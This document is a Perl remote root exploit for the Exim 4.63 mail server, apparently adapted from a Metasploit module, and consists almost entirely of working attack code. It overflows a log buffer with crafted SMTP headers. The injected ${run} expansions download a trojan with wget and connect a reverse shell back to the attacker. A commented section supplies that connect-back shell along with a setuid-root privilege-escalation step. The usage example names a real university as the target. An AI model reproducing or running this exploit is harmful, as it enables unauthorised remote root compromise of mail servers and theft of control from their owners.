#Exim 4.63 (RedHat/Centos/Debian) Remote Root Exploit by Kingcope
#Modified perl version of metasploit module

=for comment

use this connect back shell as "trojanurl" and be sure to setup a netcat,

---snip---

$system = '/bin/sh';
$ARGC=@ARGV;
if ($ARGC!=2) {
   print "Usage: $0 [Host] [Port] \n\n";
   die "Ex: $0 127.0.0.1 2121 \n";
}
use Socket;
use FileHandle;
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n";
connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print "[-] Unable to Connect Host\n";
SOCKET->autoflush();
open(STDIN, ">&SOCKET");
open(STDOUT,">&SOCKET");
open(STDERR,">&SOCKET");

open FILE, ">/var/spool/exim4/s.c";
print FILE qq{
#include <stdio.h>
#include <unistd.h>
int main(int argc, char *argv[])
{
setuid(0);
setgid(0);
setgroups(0, NULL);
execl("/bin/sh", "sh", NULL);
}
};
close FILE;

system("gcc /var/spool/exim4/s.c -o /var/spool/exim4/s; rm /var/spool/exim4/s.c");
open FILE, ">/tmp/e.conf";
print FILE "spool_directory = \${run{/bin/chown root:root /var/spool/exim4/s}}\${run{/bin/chmod 4755 /var/spool/exim4/s}}";
close FILE;

system("exim -C/tmp/e.conf -q; rm /tmp/e.conf");
system("uname -a;");
system("/var/spool/exim4/s");
system($system);

---snip---

=cut

use IO::Socket;

if ($#ARGV ne 3) {
        print "./eximxpl <host/ip> <trojanurl> <yourip> <yourport>\n";
        print "example: ./eximxpl utoronto.edu http://www.h4x.net/shell.txt 3.1.33.7 443\n";
        exit;
}

$|=1;

$trojan = $ARGV[1];
$myip = $ARGV[2];
$myport = $ARGV[3];
$helohost = "abcde.com";

$max_msg = 52428800;

my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                 PeerPort => "25",
                                 Proto    => 'tcp');

while(<$sock>) {
        print;
        if ($_ =~ /220 /) { last;}
}

print $sock "EHLO $helohost\r\n";
while(<$sock>) {
        print;
        if ($_ =~ /250-SIZE (\d+)/) {
                $max_msg = $1;
                print "Set size to $max_msg !\n";
        }
        if ($_ =~ /^250.*Hello ([^\s]+) \[([^\]]+)\]/) {
                $revdns = $1;
                $saddr = $2;
        }
        if ($_ =~ /250 /) { last;}
}

if ($revdns eq $helohost) {
        $vv = "";
} else {
        $vv = $revdns. " ";
}

$vv .= "(" . $helohost . ")";

$from = "root\@local.com";
$to = "postmaster\@localhost";

$msg_len = $max_msg + 1024*256;
$logbuffer_size = 8192;

$logbuffer = "YYYY-MM-DD HH:MM:SS XXXXXX-YYYYYY-ZZ rejected from <$from> H=$vv [$saddr]: message too big: read=$msg_len max=$max_msg\n";
$logbuffer .= "Envelope-from: <$from>\nEnvelope-to: <$to>\n";

$filler = "V" x (8 * 16);
$logbuffer_size -= 3;

for ($k=0;$k<60;$k++) {
if (length($logbuffer) >= $logbuffer_size) {last;}
$hdr = sprintf("Header%04d: %s\n", $k, $filler);
$newlen = length($logbuffer) + length($hdr);
if ($newlen > $logbuffer_size) {
        $newlen -= $logbuffer_size;
        $off = length($hdr) - $newlen - 2 - 1;
        $hdr = substr($hdr, 0, $off);
        $hdr .= "\n";
}
$hdrs .= $hdr;
$logbuffer .= "  " . $hdr;
}

$hdrx = "HeaderX: ";
$k2 = 3;
for ($k=1;$k<=200;$k++) {
        if ($k2 > 12) {
                $k2 = 3;
        }
#        $hdrx .= "\${run{/bin/sh -c 'exec /bin/sh -i <&$k2 >&0 2>&0'}} ";
        $hdrx .= "\${run{/bin/sh -c \"exec /bin/sh -c 'wget $trojan -O /tmp/c.pl;perl /tmp/c.pl $myip $myport; sleep 10000000'\"}} ";
        $k2++;
}

$v = "A" x 255 . "\n";
$body = "";
while (length($body) < $msg_len) {
        $body .= $v;
}

$body = substr($body, 0, $msg_len);

print $sock "MAIL FROM: <$from>\r\n";
$v = <$sock>;
print $v;
print $sock "RCPT TO: <$to>\r\n";
$v = <$sock>;
print $v;
print $sock "DATA\r\n";
$v = <$sock>;
print $v;

print "Sending large buffer, please wait...\n";

print $sock $hdrs;
print $sock $hdrx . "\n";
print $sock $body;
print $sock "\r\n.\r\n";
$v = <$sock>;
print $v;
print $sock "MAIL FROM: <$from>\r\n";
$v = <$sock>;
print $v;
print $sock "RCPT TO: <$to>\r\n";

while(1){};